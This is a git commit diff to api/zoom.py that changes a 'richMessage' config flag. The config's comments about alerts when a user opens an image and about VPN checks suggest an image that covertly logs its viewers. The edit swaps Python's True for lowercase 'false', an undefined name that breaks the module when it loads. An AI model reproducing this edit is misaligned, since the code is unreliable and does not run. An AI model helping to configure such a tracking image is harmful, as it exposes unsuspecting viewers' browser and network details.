3eeb5b839e220f36335939e85b1a19cd2d21340d
Hare1israe2 <93826095+Hare1israe2@users.noreply.github.com>
2023-06-16 20:17:39 +0300

    Update zoom.py

--- api/zoom.py
+++ api/zoom.py
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "Your Browser Is {browser}", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": false, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
